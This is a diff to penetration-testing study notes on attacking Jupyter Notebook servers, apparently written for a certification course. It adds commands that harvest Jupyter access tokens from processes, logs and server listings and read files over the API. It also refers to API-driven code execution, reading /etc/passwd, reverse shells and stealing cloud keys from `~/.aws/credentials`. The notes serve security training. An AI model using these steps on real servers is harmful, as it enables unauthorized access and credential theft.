@@ -1,3 +1,5 @@
+# Jupyter Notebook
+
 #Jupyter #JupyterNotebook #Python #RCE #webservices #datascience
 
 ## What is Jupyter Notebook?
@@ -11,7 +13,18 @@ Browser-based interactive computing environment for Python (and other kernels). 
 
 ---
 
-## Identification
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | Port/title fingerprint on 8888/8889 |
+| [[Tools/File Transfer/cURL\|cURL]] | `/api/*` enumeration, token-auth requests, file R/W, API-driven RCE |
+
+> RCE over the API needs no browser — a short **Python** `requests`+`websocket-client` script drives a kernel `execute_request` (see *API-Based RCE* below).
+
+---
+
+## Enumeration
 
 ```bash
 # Nmap
@@ -173,7 +186,12 @@ ps aux | grep jupyter
 grep -r "token=" /var/log/ 2>/dev/null
 find / -name "jupyter*.log" 2>/dev/null | xargs grep token
 
-# 3. .jupyter config
+# 3. Authoritative: ask Jupyter itself (prints running servers WITH tokens)
+jupyter server list        # modern (jupyter_server)
+jupyter notebook list      # classic
+# → http://localhost:8888/?token=<hex>  :: /run/user/<uid>/jupyter
+
+# 4. .jupyter config
 cat ~/.jupyter/jupyter_notebook_config.py
 cat ~/.jupyter/jupyter_server_config.py
 
@@ -287,3 +305,14 @@ print(os.popen('cat /etc/passwd').read())
 | Find token (process) | `ps aux \| grep jupyter \| grep -oP "token=\K[a-f0-9]+"` |
 | List files (API) | `curl -s http://host:8888/api/contents/` |
 | Read notebook | `curl -s "http://host:8888/files/notebook.ipynb"` |
+| Local token recovery | `jupyter server list` / `jupyter notebook list` |
+
+---
+
+> [!note] **See also** — RCE here lands you a shell as the notebook user → [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]]; data-science boxes frequently leak cloud keys (`~/.aws/credentials`, env) usable against [[Services/Cloud & Data/Kubernetes|Kubernetes]]/cloud. Reverse-shell one-liners: [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
